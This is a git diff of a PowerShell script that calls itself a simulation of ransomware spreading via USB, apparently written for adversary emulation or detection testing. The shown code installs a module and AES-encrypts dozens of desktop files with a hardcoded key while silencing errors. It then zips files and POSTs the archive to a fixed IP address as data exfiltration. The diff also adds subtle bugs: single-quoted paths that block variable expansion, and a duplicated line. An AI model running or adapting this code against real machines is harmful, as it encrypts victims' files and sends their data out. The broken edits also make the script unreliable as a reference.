@@ -1,6 +1,6 @@
 # Powershell script to simulate Ransomware Spread via USB
 
-$outfile = "C:\Windows\temp"
+$outfile = "C:\Windows\Temp"
 
 Write-Host "[+] Attack Started ..........." -ForegroundColor Green
 $RemovableDrives=@()
@@ -636,86 +636,87 @@ Start-Sleep -S 5
 Write-Host "[+] Encrypting Files" -ForegroundColor Green
 Install-Module -Name DRTools -Force
 $key = "SWxvdmVyYW5zb213YXJlPDM="
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom1.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom2.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom3.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom4.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom5.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom6.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom7.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom8.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom9.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom10.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom11.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom12.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom13.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom14.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom15.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom16.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom17.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom18.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom19.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom20.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom21.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom22.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom23.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom24.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom25.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom26.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom27.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom28.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom29.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom30.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom31.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom32.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom33.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom34.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom35.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom36.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom37.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom38.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom39.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom40.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom41.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom42.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom43.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom44.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom45.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom46.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom47.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom48.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom49.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom50.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom51.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom52.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom53.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom54.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom55.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom56.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom57.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom58.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom59.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom60.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom61.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom62.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom63.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom64.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom65.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom66.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom67.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom68.lnk
-Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom69.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom1.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom2.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom3.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom4.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom5.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom6.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom7.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom8.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom9.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom10.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom11.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom12.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom13.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom14.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom15.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom16.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom17.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom18.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom19.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom20.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom21.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom22.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom23.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom24.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom25.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom26.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom27.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom28.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom29.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom30.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom31.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom32.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom33.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom34.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom35.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom36.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom37.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom38.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom39.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom40.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom41.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom42.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom43.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom44.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom45.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom46.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom47.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom48.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom49.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom50.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom50.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom51.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom52.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom53.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom54.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom55.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom56.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom57.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom58.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom59.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom60.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom61.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom62.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom63.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom64.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom65.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom66.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom67.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom68.lnk -erroraction 'silentlycontinue'
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\$env:USERNAME\Desktop\Ransom69.lnk -erroraction 'silentlycontinue'
 
 Start-Sleep -S 15
 
 Write-Host "[+] Preparing Files" -ForegroundColor Green
-$files = "C:\Users\$env:USERNAME\Desktop\Ransom.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom1.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom2.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom3.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom4.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom6.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom7.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom8.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom9.lnk", "C:\Users\$env:USERNAME\Documents\SecretStuff.txt"
-Compress-Archive -LiteralPath $files -DestinationPath $outfile\Ransom_Data.zip
+$files = "C:\Users\$env:USERNAME\Desktop\Ransom.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom1.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom2.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom3.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom4.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom6.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom7.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom8.lnk", "C:\Users\$env:USERNAME\Desktop\Ransom9.lnk"
+Compress-Archive -LiteralPath $files -DestinationPath '$outfile\Ransom_Data.zip'
 
 Write-Host "[+] Exfiltrating Data" -ForegroundColor Green
 # Exfil will fail due to IP address
-$content1 = Get-Content $outfile\Ransom_Data.zip
+$content1 = Get-Content '$outfile\Ransom_Data.zip'
 Invoke-WebRequest -Uri 172.31.33.33 -Method POST -Body $content1
 
 Start-Sleep -S 5
